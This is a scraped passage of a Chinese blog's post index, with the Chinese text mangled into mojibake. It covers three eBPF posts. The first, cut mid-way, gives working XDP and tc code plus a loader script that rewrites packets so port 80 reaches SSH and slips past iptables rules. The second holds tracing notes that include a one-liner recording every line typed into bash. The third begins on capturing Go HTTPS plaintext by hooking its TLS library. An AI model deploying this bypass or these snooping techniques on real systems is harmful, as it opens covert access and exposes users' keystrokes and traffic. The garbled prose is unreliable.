update_checksum_32(iphdr-\u0026gt;saddr,0x8389a8c0,\u0026amp;ipcsum); // è®©ä¼ å…¥é¶æœºçš„tcpchecksumæ­£ç¡® update_checksum_32(iphdr-\u0026gt;saddr,0x8389a8c0,\u0026amp;tcpcsum); iphdr-\u0026gt;saddr = 0x8389a8c0; iphdr-\u0026gt;check = __swab16(ipcsum); // ä¿®æ”¹tcpç›®æ ‡ç«¯å£ update_checksum_16(tcphdr-\u0026gt;dest,htons(22),\u0026amp;tcpcsum); tcphdr-\u0026gt;dest = htons(22); tcphdr-\u0026gt;check = __swab16(tcpcsum); } } } return XDP_PASS; } SEC(\u0026#34;tc/egress\u0026#34;) int xdp_bypass_iptables_egress(struct __sk_buff *skb) { void *data = (void *)(long)skb-\u0026gt;data; void *data_end = (void *)(long)skb-\u0026gt;data_end; /* Make sure a full ethernet header, ip header and tcp header are there. */ if (data + 14 /*sizeof(struct ethhdr)*/ + 20 /*sizeof(struct iphdr)*/ + 20 /*sizeof(struct tcphdr)*/ \u0026gt; data_end) return TC_ACT_OK; struct ethhdr *eth = data; struct iphdr *iphdr = data + sizeof(struct ethhdr); struct tcphdr *tcphdr = data + sizeof(struct ethhdr) + sizeof(struct iphdr); if(eth-\u0026gt;h_proto == htons(ETH_P_IP)){ // \u0026lt;linux/if_ether.h\u0026gt; if(iphdr-\u0026gt;protocol == IPPROTO_TCP){ // local:22-\u0026gt;192.168.137.1:any if(iphdr-\u0026gt;daddr == 0x8389a8c0 \u0026amp;\u0026amp; tcphdr-\u0026gt;source == htons(22)){ __u32 ipcsum = __swab16(iphdr-\u0026gt;check); __u32 tcpcsum = __swab16(tcphdr-\u0026gt;check); // ä¿®æ”¹ipç›®çš„åœ°å€ update_checksum_32(iphdr-\u0026gt;daddr,0x8388a8c0,\u0026amp;ipcsum); // recover tcpchecksum offset // è®©ä¼ å›ä¸»æœºç«¯çš„tcpchecksumæ­£ç¡® update_checksum_32(0x8388a8c0,iphdr-\u0026gt;daddr,\u0026amp;tcpcsum); iphdr-\u0026gt;daddr = 0x8388a8c0; // 192.168.136.1 iphdr-\u0026gt;check = __swab16(ipcsum); // ä¿®æ”¹tcpæ¥æºç«¯å£ tcphdr-\u0026gt;source = htons(80); tcphdr-\u0026gt;check = __swab16(tcpcsum); } } } return TC_ACT_OK; } ç¨‹åºç¼–è¯‘é€‰ç”¨libbpf-bootstrapçš„makefileï¼Œåªå†™.bpf.cç¨‹åºå³å¯ï¼Œå› ä¸ºæˆ‘ä»¬åªè¦.oç¨‹åº\nç¨‹åºæŒ‚è½½å› ä¸ºä¸ºäº†è°ƒè¯•æ–¹ä¾¿å†™äº†ä¸ªç®€å•çš„è„šæœ¬ï¼Œè¦æ³¨æ„çš„æ˜¯æ¯æ¬¡é‡å¯éœ€è¦æ·»åŠ qdisc\nä»å†…æ ¸ 4.1 ç‰ˆæœ¬èµ·ï¼Œå¼•å…¥äº†ä¸€ä¸ªç‰¹æ®Šçš„ qdiscï¼Œå«åš clsactï¼Œå®ƒä¸ºTCæä¾›äº†ä¸€ä¸ªå¯ä»¥åŠ è½½BPFç¨‹åºçš„å…¥å£ï¼Œä½¿TCå’ŒXDPä¸€æ ·ï¼Œæˆä¸ºä¸€ä¸ªå¯ä»¥åŠ è½½BPFç¨‹åºçš„ç½‘ç»œé’©å­ã€‚\n1 2 3 4 5 6 7 #!/bin/bash # sudo tc qdisc add dev ens33 clsact sudo ip link set dev ens33 xdp off sudo tc filter del dev ens33 egress sudo ip link set dev ens33 xdp obj xdpbypass.bpf.o sec xdp/ingress sudo tc filter add dev ens33 egress bpf da obj xdpbypass.bpf.o sec tc/egress sudo tcpdump -i ens33 -w out.pcap æœ€ç»ˆç»“æœå¦‚å›¾ 80ç«¯å£æˆåŠŸè¿æ¥ssh\nå‚è€ƒ https://tech.meituan.com/2022/04/07/how-to-detect-bad-ebpf-used-in-linux.html\nhttps://github.com/cehrig/tc-bpf-dynamic-gre\n","description":"","id":13,"section":"posts","tags":["network","bpf"],"title":"eBPF bypass iptables","uri":"https://ruokeqx.gitee.io/posts/ebpf_bypass_iptables/"},{"content":"ç®€å•å­¦ä¹ äº†ä¸€ä¸‹BCCå’Œbpftrace å¢åŠ äº†bypass go tlsçš„bpftraceå†™æ³• è§eBPF Uprobe bypass Go tlsâ€”â€”æŠ“å–httpsæ˜æ–‡æµé‡\nBCC \u0026amp; bpftraceå†…éƒ¨å®ç° BCCç”±ä¸€ä¸ªC++å‰ç«¯APIç”¨äºå†…æ ¸æ€çš„BPFç¨‹åºçš„ç¼–åˆ¶ã€ä¸€ä¸ªC++åç«¯é©±åŠ¨ä½¿ç”¨Clang/LLVMç¼–è¯‘BPFç¨‹åºå¹¶å°†å…¶è£…è½½åˆ°å†…æ ¸ä¸ŠæŒ‚è½½åˆ°æ—¶é—´ä¸Šå¹¶å¯¹BPFæ˜ å°„è¡¨è¿›è¡Œè¯»å†™ã€ç”¨äºç¼–å†™BCCå·¥å…·çš„è¯­è¨€å‰ç«¯ï¼šPythonã€C++ ç»„æˆã€‚\nbpftraceå‰ç«¯ä½¿ç”¨lexå’Œyaccå¯¹bpftraceç¼–ç¨‹è¯­è¨€è¿›è¡Œæ­¤æ³•å’Œè¯­æ³•åˆ†æï¼Œä½¿ç”¨clangæ¥è§£æç»“æ„ä½“ã€‚åç«¯åˆ™å°†bpftraceç¨‹åºç¼–è¯‘æˆLLVM IRï¼Œç„¶åå†é€šè¿‡LLVMåº“å°†å…¶ç¼–è¯‘æˆBPFä»£ç ã€‚\näº‹ä»¶æºåŠå…¶å®ç° kprobeï¼ˆint3ä¸­æ–­ï¼‰ å…·ä½“ä½¿ç”¨ä¾èµ–äºå‰ç«¯è·Ÿè¸ªå™¨:åŒ…æ‹¬perfã€systemtapä»¥åŠBPFè¿½è¸ªå™¨å¦‚BCCå’Œbpftrace\nkretprobeï¼ˆè¿”å›åœ°å€trampolineï¼‰\ntracepoint (nop å¯ç”¨æ—¶æ”¹jump trampoline) æ€§èƒ½æŸè€—æ›´ä½ æ¯”kprobeç¨³å®š\nè®¸å¤šåº”ç”¨é»˜è®¤ä¸å¼€å¯USDT å¯ä»¥ä½¿ç”¨Folly C++åº“æ·»åŠ æˆ–è€…ä½¿ç”¨systemtap-sdt-devåŒ…æä¾›çš„å¤´æ–‡ä»¶å’Œå·¥å…·ï¼ˆnop å¯ç”¨æ”¹int3ï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # BCC attach_kprobe() attach_kretprobe() attach_uprobe() attach_uretprobe() TRACEPOINT_PROBE() USDT().enable_probe() # bpftrace \u0026#39;kprobe:subsystem:eventname { to do }\u0026#39; \u0026#39;uprobe:/path/to/file:method { to do }\u0026#39; \u0026#39;tracepoint:sched:sched_process_exec { to do }\u0026#39; \u0026#39;usdt:/path/to/file:method { to do }\u0026#39; \u0026#39;software:event:count\u0026#39; \u0026#39;hardware:event:count\u0026#39; åŠ¨æ€USDT\né¢„ç¼–è¯‘å…±äº«åº“ å‡½æ•°é¢„å…ˆæ’å…¥USDT éœ€è¦æ—¶dlopen()åŠ è½½åŠ¨æ€åº“ è°ƒç”¨å‡½æ•° PMCæ—¶CPUä¸Šç¡¬ä»¶å¯ç¼–ç¨‹çš„è®¡æ•°å™¨ å¹¿æ³›ç”¨äºæ€§èƒ½åˆ†æå¦‚ç¼“å­˜å‘½ä¸­ç‡ æŒ‡ä»¤æ‰§è¡Œæ•ˆç‡ é˜»å¡æŒ‡ä»¤å‘¨æœŸç­‰\nä¸¤ç§å·¥ä½œæ¨¡å¼ï¼šè®¡æ•°å’Œæº¢å‡ºé‡‡æ ·(è¶…è¿‡ä¸€å®šå€¼å‘é€ä¿¡å·)\nPMCç”±äºå­˜åœ¨ä¸­æ–­å»¶è¿Ÿæˆ–è€…ä¹±åºæ‰§è¡Œ Intelå¼€å‘ä¸€ç§è§£å†³æ–¹æ¡ˆå«PEBSç²¾ç¡®è®¡æ•°\nBCCå’Œbpftraceä½¿ç”¨perf_eventsä½œä¸ºä»–ä»¬çš„ç¯å½¢ç¼“å†²åŒº ç„¶ååˆå¢åŠ äº†PMCçš„æ”¯æŒ ç°åœ¨åˆé€šè¿‡perf_event_open() æ¥å¯¹æ‰€æœ‰äº‹ä»¶è¿›è¡Œè§‚æµ‹\nperfä¹Ÿå¼€å‘äº†ä¸€ä¸ªä½¿ç”¨BPFçš„æ¥å£ ä½¿å…¶æˆä¸ºBPFè¿½è¸ªå™¨ æ˜¯å”¯ä¸€ä¸€ä¸ªå†…ç½®åœ¨Linuxä¸­çš„BPFå‰ç«¯\nbpftraceè¿˜åŒ…æ‹¬BEGINå’ŒENDå³bpftraceå¯åŠ¨å’Œé€€å‡ºçš„äº‹ä»¶\nSoftware\ncpu-clock or cpu task-clock page-faults or faults context-switches or cs cpu-migrations minor-faults major-faults alignment-faults emulation-faults dummy bpf-output Hardware\ncpu-cycles or cycles instructions cache-references cache-misses branch-instructions or branches branch-misses bus-cycles frontend-stalls backend-stalls ref-cycles bpftool kernelä»£ç tools/bpfä¸­åŒ…å«bpftool å…¶æœ‰å¾ˆå¤šåŠŸèƒ½æ¨¡å—\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # perf å­å‘½ä»¤æ˜¾ç¤ºå“ªäº›BPFç¨‹åºæ­£åœ¨é€šè¿‡pref_event_open() bpftool perf # prog show å­å‘½ä»¤ä¼šåˆ—å‡ºå…¨éƒ¨çš„ç¨‹åºï¼ˆä¸æ­¢åŸºäºpref_event_open()çš„ï¼‰ bpftool prog show # xlated å¯ä»¥ dump è¿›ç¨‹å¯¹åº”çš„BPFæ±‡ç¼–æŒ‡ä»¤ bpftool prog dump xlated id 234 # å¦‚æœåŒ…å«BTFä¿¡æ¯ æ˜¾ç¤ºæºç  bpftool prog dump xlated id 263 # å¦‚æœåŒ…å«BTFä¿¡æ¯ æ˜¾ç¤ºè¡Œå· bpftool prog dump xlated id 263 linum # opcodes æ˜¾ç¤ºBPFæŒ‡ä»¤opcode bpftool prog dump xlated id 263 opcodes # visual dotæ ¼å¼è¾“å‡ºæ§åˆ¶æµä¿¡æ¯ å¯ä»¥ç”¨GraphVizç»˜å›¾ bpftool prog dump xlated id 263 visual # jited æ˜¾ç¤ºx86_64æ±‡ç¼– bpftool prog dump jited id 263 bpftraceä½¿ç”¨ åŸºç¡€ bpftraceæœ‰å¾ˆå¤šå†…ç½®å˜é‡å’Œå‡½æ•°ï¼Œå…·ä½“è§https://github.com/iovisor/bpftrace/blob/master/docs/reference_guide.md\nåŸºç¡€å˜é‡ï¼ˆglobalã€$localå’Œper[tid]ï¼‰\nå†…ç½®å˜é‡ï¼ˆusernameã€pidã€tidã€commï¼ˆè¿›ç¨‹åï¼‰ã€nsecsï¼ˆçº³ç§’ä¸ºå•ä½çš„æ—¶é—´æˆ³ï¼‰..ï¼‰\nå…³è”æ•°ç»„ï¼ˆkey[value]ï¼‰\né¢‘ç‡è®¡æ•°ï¼ˆcount() æˆ–è€… ++ï¼‰\nä¸´æ—¶å˜é‡ $\nBPFæ˜ å°„è¡¨å˜é‡ @ï¼ˆå¯åœ¨ä¸åŒåŠ¨ä½œä¹‹é—´ä¼ é€’ï¼‰\nè°ƒç”¨æ ˆä¿¡æ¯ï¼ˆkstackã€ustackï¼‰\nè¿”å›å€¼ï¼ˆretvalï¼‰ è¿½è¸ªå‡½æ•°åï¼ˆfuncï¼‰ æ¢é’ˆåï¼ˆprobeï¼‰ CgroupId(cgroup)\nå‚æ•°ï¼ˆargsã€arg0.arg1 argNï¼‰\nå‚æ•°ï¼ˆsarg0.sarg1 sargNï¼‰é‚£äº›ç”¨æ ˆä¼ å€¼çš„ç¨‹åºï¼ˆ1.17ä»¥å‰çš„Goï¼‰\nbpftraceé€‰é¡¹ bpftrace -e 'probe /filter/ { action };\nbpftrace -l å¯ä»¥ä½¿ç”¨é€šé…ç¬¦åˆ—å‡ºæ‰€æœ‰åŠ¨æ€æ’æ¡©ç‚¹å’Œé™æ€æ’æ¡©ç‚¹\ntracepointçš„å‘½åæ–¹å¼æ˜¯subsystem:eventname å¦‚ kmem:kmalloc\n1 2 3 4 sudo bpftrace -l \u0026#39;kprobe:*\u0026#39; sudo bpftrace -l \u0026#39;kretprobe:*\u0026#39; sudo bpftrace -l \u0026#39;tracepoint:syscalls:*\u0026#39; sudo bpftrace -l \u0026#34;usdt:/lib/x86_64-linux-gnu/libc.so.6:*\u0026#34; åŠ¨æ€æ’æ¡©åˆ†æˆkprobe kretprobe uprobe uretprobe\ntracepointé€šé…å¯ä»¥çœ‹åˆ°ç³»ç»Ÿè°ƒç”¨éƒ½è¢«åˆ†ä¸ºsys_open_* å’Œ sys_close_*\nbpftrace -e å¯ä»¥æ‰§è¡Œç®€çŸ­bpftraceè„šæœ¬\n1 2 3 4 5 âœ tools git:(master) sudo bpftrace -e \u0026#39;tracepoint:syscalls:sys_enter_open* { @[probe] = count(); }\u0026#39; Attaching 5 probes... ^C @[tracepoint:syscalls:sys_enter_openat]: 33 è¿½è¸ªå‚æ•° tracepointé€šå¸¸å¸¦æœ‰å‚æ•° bpftraceå¯ä»¥é€šè¿‡argsè®¿é—®è¿™äº›å‚æ•°çš„ä¿¡æ¯ï¼Œå¦‚\n1 \u0026#39;tracepoint:net:netif_rx\u0026#39; args-\u0026gt;len è¿™äº›å‚æ•°å¯ä»¥é€šè¿‡-væŸ¥çœ‹ -låˆ—å‡º -vè¯¦ç»†æ¨¡å¼\n1 2 sudo bpftrace -lv tracepoint:syscalls:sys_enter_read sudo bpftrace -e \u0026#39;tracepoint:syscalls:sys_enter_clone { printf(\u0026#34;-\u0026gt;clone() by %s PID %d\\n\u0026#34;, comm, pid); } tracepoint:syscalls:sys_exit_close { printf(\u0026#34;\u0026lt;-clone() return %d, %s PID %d\\n\u0026#34;, args-\u0026gt;ret, comm, pid); }\u0026#39; kprobeçš„å‚æ•°\u0026quot;arg0,arg1\u0026hellip;argN\u0026quot;æ˜¯è¿›å…¥å‡½æ•°çš„å‚æ•° ç±»å‹å‡ä¸ºuint64 å¦‚æœä»–ä»¬æŒ‡å‘Cç»“æ„ä½“çš„æŒ‡é’ˆ å¯ä»¥å¼ºåˆ¶ç±»å‹è½¬åŒ–ä¸ºå¯¹åº”çš„ç»“æ„ä½“ã€‚\nä¹Ÿå°±æ˜¯è¯´é™æ€æ’æ¡©å¦‚tracepointç”¨çš„æ˜¯argsï¼ŒåŠ¨æ€æ’æ¡©å¦‚kprobeç”¨çš„æ˜¯arg0\u0026hellip;\nBPFå¹¶å‘æ§åˆ¶ã€æ ˆå›æº¯ å¹¶è¡Œå¤šçº¿ç¨‹å¯èƒ½åŒæ—¶æ›´æ–°æ˜ å°„è¡¨æ•°æ®ä»è€Œå¯¼è‡´æ•°æ®ä¸¢å¤±ï¼ŒBCCå’Œbpftraceå‰ç«¯ä½¿ç”¨äº†per CPUçš„ç‹¬ç«‹æ•°ç»„æ˜ å°„ é¿å…å¹¶è¡Œçº¿ç¨‹å¯¹å…±äº«æ•°æ®çš„æ›´æ–°\n1 2 3 4 5 6 7 8 âœ linux sudo strace -febpf bpftrace -e \u0026#39;k:vfs_read { @ = count(); }\u0026#39; ... bpf(BPF_MAP_CREATE, {map_type=BPF_MAP_TYPE_PERCPU_ARRAY, ... âœ linux sudo strace -febpf bpftrace -e \u0026#39;k:vfs_read { @++; }\u0026#39; ... bpf(BPF_MAP_CREATE, {map_type=BPF_MAP_TYPE_HASH, ... ç”±äºéªŒè¯å™¨çš„å­˜åœ¨BPFæ˜¯å—é™çš„å›¾çµå®Œå¤‡ è·Ÿethereumçš„gasç±»ä¼¼æœ‰é™åˆ¶æ— é™å¾ªç¯çš„åŠŸèƒ½\næ ˆå¤§å°é™åˆ¶åœ¨512å­—èŠ‚ä¹Ÿå°±æ˜¯0x200\nåŒxv6å®éªŒ BPFä¹Ÿå¯ä»¥ç”¨æ ˆå›æº¯è·å–è°ƒç”¨ä¿¡æ¯(RBP gccé»˜è®¤å…³é—­åŠŸèƒ½ ä½†æ˜¯x64æ€§èƒ½æå‡ä¸æ˜æ˜¾)\næ ˆå›æº¯è¿˜å¯ä»¥ä½¿ç”¨debuginfoã€LBRã€ORCç­‰æ–¹æ³•\ndebuginfo DWARFæ ¼å¼ æµªè´¹è®¡ç®—èµ„æº LBR intelåŸºäºç¡¬ä»¶çš„åˆ†æ”¯å›æº¯ ORCæ–°çš„è°ƒè¯•ä¿¡æ¯æ ¼å¼\nBCCå’Œbpftraceè°ƒè¯• BCC 1 b = BPF(text=prog,debug=flags) DEBUG_LLVM_IR = 0x1 compiled LLVM IR\nDEBUG_BPF = 0x2 loaded BPF bytecode and register state on branches\nDEBUG_PREPROCESSOR = 0x4 pre-processor result\nDEBUG_SOURCE = 0x8 ASM instructions embedded with source\nDEBUG_BPF_REGISTER_STATE = 0x10 register state on all instructions in addition to DEBUG_BPF\nDEBUG_BTF = 0x20 print the messages from the libbpf library.\nBCCçš„bpflistå·¥å…· å†…æ ¸çš„bpftoolå·¥å…·\nbpftrace -dè¾“å‡ºASTå’ŒLLVM IR\n-ddè¯¦æƒ…æ¨¡å¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 âœ bpftool sudo bpftrace -d -e \u0026#39;k:vfs_read { @[pid] = count(); }\u0026#39; AST after: parser ------------------- Program kprobe:vfs_read = map: @ :: type[none, ctx: 0] builtin: pid :: type[none, ctx: 0] call: count :: type[none, ctx: 0] AST after: Semantic ------------------- Program kprobe:vfs_read = map: @ :: type[count, ctx: 0] builtin: pid :: type[unsigned int64, ctx: 0] call: count :: type[count, ctx: 0] AST after: NodeCounter ------------------- Program kprobe:vfs_read = map: @ :: type[count, ctx: 0] builtin: pid :: type[unsigned int64, ctx: 0] call: count :: type[count, ctx: 0] AST after: ResourceAnalyser ------------------- Program kprobe:vfs_read = map: @ :: type[count, ctx: 0] builtin: pid :: type[unsigned int64, ctx: 0] call: count :: type[count, ctx: 0] ; ModuleID = \u0026#39;bpftrace\u0026#39; source_filename = \u0026#34;bpftrace\u0026#34; target datalayout = \u0026#34;e-m:e-p:64:64-i64:64-i128:128-n32:64-S128\u0026#34; target triple = \u0026#34;bpf-pc-linux\u0026#34; ; Function Attrs: nounwind declare i64 @llvm.bpf.pseudo(i64 %0, i64 %1) #0 define i64 @\u0026#34;kprobe:vfs_read\u0026#34;(i8* nocapture readnone %0) local_unnamed_addr section \u0026#34;s_kprobe:vfs_read_1\u0026#34; { entry: %\u0026#34;@_val\u0026#34; = alloca i64, align 8 %\u0026#34;@_key\u0026#34; = alloca i64, align 8 %get_pid_tgid = tail call i64 inttoptr (i64 14 to i64 ()*)() %1 = lshr i64 %get_pid_tgid, 32 %2 = bitcast i64* %\u0026#34;@_key\u0026#34; to i8* call void @llvm.lifetime.start.p0i8(i64 -1, i8* nonnull %2) store i64 %1, i64* %\u0026#34;@_key\u0026#34;, align 8 %pseudo = tail call i64 @llvm.bpf.pseudo(i64 1, i64 0) %lookup_elem = call i8* inttoptr (i64 1 to i8* (i64, i64*)*)(i64 %pseudo, i64* nonnull %\u0026#34;@_key\u0026#34;) %map_lookup_cond.not = icmp eq i8* %lookup_elem, null br i1 %map_lookup_cond.not, label %lookup_merge, label %lookup_success ... âœ bpftool sudo bpftrace -d -e \u0026#39;k:vfs_read { @[pid] = count(); }\u0026#39; | wc -l 88 âœ bpftool sudo bpftrace -dd -e \u0026#39;k:vfs_read { @[pid] = count(); }\u0026#39; | wc -l 163 -vå¼€å¯è¯¦æƒ…æ¨¡å¼ ä¹¦ä¸Šè¯´ä¼šè¾“å‡ºprograme idå’Œå­—èŠ‚ç  å¯ä»¥é…åˆbpftool progä½¿ç”¨\nå®é™…ä¸Šåªè¾“å‡ºäº†programe id\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 âœ bpftool sudo bpftrace -v -e \u0026#39;k:vfs_read { @[pid] = count(); }\u0026#39; INFO: node count: 7 Attaching 1 probe... Program ID: 64 The verifier log: processed 30 insns (limit 1000000) max_states_per_insn 0 total_states 2 peak_states 2 mark_read 1 Attaching kprobe:vfs_read ^C @[919]: 1 @[1300]: 1 ... å®‰å…¨ https://github.com/brendangregg/bpf-perf-tools-book/tree/master/originals/Ch11_Security\n1 2 3 4 5 6 7 8 9 10 11 12 13 bashreadline.bt capable.bt elfsnoop.bt eperm.bt modsnoop.bt setuids.bt shellsnoop.bt shellsnoop.py tcpreset.bt ttysnoop.bt # ç›‘æ§bashè¾“å…¥ sudo bpftrace -e \u0026#39;uretprobe:/bin/bash:readline { printf(\u0026#34;%-6d %s\\n\u0026#34;,pid,str(retval)) }\u0026#39; å®¹å™¨ å‘½åç©ºé—´ cgroupè¿›è¡Œèµ„æºæ§åˆ¶ æ‰€æœ‰å®¹å™¨å…±äº«åŒä¸€ä¸ªå†…æ ¸\nå†…æ ¸ä¸­æœ‰é’ˆå¯¹cgroupäº‹ä»¶çš„è·Ÿè¸ªç‚¹ åŒ…æ‹¬ cgroup:cgroup_setup_rootã€cgroup:cgroup_attach_task\nä¹Ÿå¯ä»¥ä½¿ç”¨BPF_PROG_TYPE_CGROUP_SKBç¨‹åºç±»å‹å’Œ é™„åŠ åˆ°cgroupå…¥å£ç‚¹å’Œå‡ºå£ç‚¹ä¸Šå¤„ç†ç½‘ç»œæ•°æ®åŒ…\nBPFè·Ÿè¸ªéœ€è¦rootç‰¹æƒ è¿™å¯¹äºå¤§éƒ¨åˆ†å®¹å™¨ç¯å¢ƒæ¥è¯´ æ„å‘³ç€BPFè·Ÿè¸ªå·¥å…·åªèƒ½åœ¨å®¿ä¸»æœºä¸Šæ‰§è¡Œä¸èƒ½åœ¨å®¹å™¨å†…æ‰§è¡Œ\nå®¹å™¨ä½¿ç”¨ä¸€äº›å‘½åç©ºé—´çš„ç»„åˆ è¯¦ç»†ä¿¡æ¯å¯ä»¥é€šè¿‡å†…æ ¸çš„nsproxy.hç»“æ„ä½“è¯»å– linux/nsproxy.h\nä¼ ç»Ÿå·¥å…·ï¼šsystemd-cgtopã€kubectl topã€ docker statsã€/sys/fs/cgroupsã€pref\nBPFå·¥å…·ï¼šrunqlatã€pidnssã€blkthrotã€overlayfs\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include \u0026lt;linux/sched.h\u0026gt; #include \u0026lt;linux/nsproxy.h\u0026gt; #include \u0026lt;linux/utsname.h\u0026gt; #include \u0026lt;linux/pid_namespace.h\u0026gt; BEGIN { printf(\u0026#34;Tracing PID namespace switches. Ctrl-C to end\\n\u0026#34;); } kprobe:finish_task_switch { $prev = (struct task_struct *)arg0; $curr = (struct task_struct *)curtask; $prev_pidns = $prev-\u0026gt;nsproxy-\u0026gt;pid_ns_for_children-\u0026gt;ns.inum; $curr_pidns = $curr-\u0026gt;nsproxy-\u0026gt;pid_ns_for_children-\u0026gt;ns.inum; if ($prev_pidns != $curr_pidns) { @[$prev_pidns, $prev-\u0026gt;nsproxy-\u0026gt;uts_ns-\u0026gt;name.nodename] = count(); } } END { printf(\u0026#34;\\nVictim PID namespace switch counts [PIDNS, nodename]:\\n\u0026#34;); } cgroup blk æ§åˆ¶å™¨åŸºäºç¡¬é™åˆ¶æ¥é™åˆ¶I/Oçš„æ—¶é—´ ç»Ÿè®¡è¢«é™åˆ¶æ¬¡æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include \u0026lt;linux/cgroup-defs.h\u0026gt; #include \u0026lt;linux/blk-cgroup.h\u0026gt; BEGIN { printf(\u0026#34;Tracing block I/O throttles by cgroup. Ctrl-C to end\\n\u0026#34;); } kprobe:blk_throtl_bio { @blkg[tid] = arg1; } kretprobe:blk_throtl_bio /@blkg[tid]/ { $blkg = (struct blkcg_gq *)@blkg[tid]; if (retval) { @throttled[$blkg-\u0026gt;blkcg-\u0026gt;css.id] = count(); } else { @notthrottled[$blkg-\u0026gt;blkcg-\u0026gt;css.id] = count(); } delete(@blkg[tid]); } è·Ÿè¸ªoverlayæ–‡ä»¶ç³»ç»Ÿçš„è¯»å†™å»¶è¿Ÿ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 #include \u0026lt;linux/nsproxy.h\u0026gt; #include \u0026lt;linux/pid_namespace.h\u0026gt; kprobe:ovl_read_iter /((struct task_struct *)curtask)-\u0026gt;nsproxy-\u0026gt;pid_ns_for_children-\u0026gt;ns.inum == $1/ { @read_start[tid] = nsecs; } kretprobe:ovl_read_iter /((struct task_struct *)curtask)-\u0026gt;nsproxy-\u0026gt;pid_ns_for_children-\u0026gt;ns.inum == $1/ { $duration_us = (nsecs - @read_start[tid]) / 1000; @read_latency_us = hist($duration_us); delete(@read_start[tid]); } kprobe:ovl_write_iter /((struct task_struct *)curtask)-\u0026gt;nsproxy-\u0026gt;pid_ns_for_children-\u0026gt;ns.inum == $1/ { @write_start[tid] = nsecs; } kretprobe:ovl_write_iter /((struct task_struct *)curtask)-\u0026gt;nsproxy-\u0026gt;pid_ns_for_children-\u0026gt;ns.inum == $1/ { $duration_us = (nsecs - @write_start[tid]) / 1000; @write_latency_us = hist($duration_us); delete(@write_start[tid]); } interval:ms:1000 { time(\u0026#34;\\n%H:%M:%S --------------------\\n\u0026#34;); print(@write_latency_us); print(@read_latency_us); clear(@write_latency_us); clear(@read_latency_us); } END { clear(@write_start); clear(@read_start); } å…¶ä»– 1 2 man getaddrinfo man setitimer ","description":"","id":14,"section":"posts","tags":["bpf"],"title":"BCCã€bpftrace \u0026\u0026 BPF Performance Tools","uri":"https://ruokeqx.gitee.io/posts/bpf_performance_tools/"},{"content":"Background æŸæ—¥åœ¨çœ‹å†°èæµé‡ å†°èè¿ä¸Šåå®¢æˆ·ç«¯ä¼šè·Ÿå«æœ‰å†°èå¼€å‘è€…idçš„ä¼—å¤šåŸŸåè¿›è¡Œtlsäº¤äº’ å›ºæ•°æ®ä¸å¯è§\nå­¦å¼ŸæåŠçœ‹åˆ°è¿‡æŸé¡¹ç›®å¯ä»¥ç›´æ¥hookåº•å±‚åº“å¹¶æŠ“å–æ˜æ–‡ä¿¡æ¯\nç”±äºä¹‹å‰å‚ç…§ginå®ç°è¿‡ç®€å•çš„webæ¡†æ¶äº†è§£åˆ°goä¸­æ•°æ®éƒ½æ˜¯net/httpåº“å’Œcrypto/tlsåº“å¤„ç†çš„ æ‰€ä»¥æƒ³è‡ªå·±å®ç°ä¸€ä¸‹hookä¸€ä¸‹golang tlsåº“å®ç°æŠ“å–æ˜æ–‡æµé‡çš„åŠŸèƒ½ï¼Œå½“ç„¶è¿™å¯¹æ‰€æœ‰goç¼–å†™çš„httpsæ˜¯é€šç”¨çš„\nè‡³äºç”¨é€” å¯ä»¥æ˜¯è‡ªå·±å¼€å‘httpsæ—¶æµ‹è¯•ã€å¯ä»¥æ˜¯å®¢æˆ·ç«¯ç›‘æ§ã€å¯ä»¥æ˜¯èœœç½è·å–ç”¨æˆ·payload\nåæ³¨[2022-06-18]:bccè‡ªå¸¦çš„toolsä¸­æœ‰ç°æˆçš„sslsniff.pyå…¶ä¸­è‡ªå¸¦traceä¼—å¤šlibåº“valid_types = frozenset(['openssl', 'gnutls', 'nss'])å®ç°è·å–æ˜æ–‡çš„åŠŸèƒ½ã€‚å½“ç„¶æ­¤å¤„çš„bypass go tlsæ˜¯æ²¡æœ‰ç°æˆçš„å·¥å…·ã€‚å¯¹äºfirefoxç­‰ç¨‹åºï¼Œé€šå¸¸sslsniffä¸èµ·ä½œç”¨ï¼Œå› ä¸ºfirefoxä½¿ç”¨çš„æ˜¯å®‰è£…ç›®å½•è‡ªå¸¦çš„soåº“ã€‚\nConcepts æ‰©å±•çš„BPF(eBPF) æ˜¯ Linux 4.x+ é‡Œçš„ä¸€é¡¹å†…æ ¸æŠ€æœ¯. ç±»ä¼¼è¿è¡Œåœ¨ Linux å†…æ ¸ä¸­çš„è½»é‡çº§çš„æ²™ç®±è™šæ‹Ÿæœº, å¯ä»¥æä¾›å¯¹å†…æ ¸å†…å­˜çš„ç»è¿‡éªŒè¯çš„è®¿é—®.\neBPF å…è®¸å†…æ ¸è¿è¡Œ BPF å­—èŠ‚ç  å¹¶ä¸” BPF æ¢é’ˆæ¯æ¬¡è¢«è§¦å‘æ—¶, éƒ½ä¼šæ‰§è¡Œå¯¹åº”çš„å­—èŠ‚ç \nuprobe å¯ä»¥é€šè¿‡æ’å…¥è§¦å‘è½¯ä¸­æ–­çš„è°ƒè¯•é™·é˜±æŒ‡ä»¤(x86 ä¸Šçš„ int3)æ¥æ‹¦æˆªç”¨æˆ·æ€ç¨‹åº [å®é™…ç¼–è¯‘è°ƒè¯•åå‘ç°ç¡®å®æ˜¯ä¿®æ”¹hookå¤„ç¬¬ä¸€ä¸ªæŒ‡ä»¤ä¸ºcc PS:è¿™ä¸æ˜¯éšä¾¿åè°ƒ]\nç»è¿‡ç¼–è¯‘å’ŒéªŒè¯çš„ BPF ç¨‹åºå°†ä½œä¸º uprobe çš„ä¸€éƒ¨åˆ†æ‰§è¡Œ, å¹¶ä¸”å¯ä»¥å°†ç»“æœå†™å…¥ç¼“å†²åŒº.\nImplementation target.goâ€”â€”ç›®æ ‡ç¨‹åºç¼–å†™ 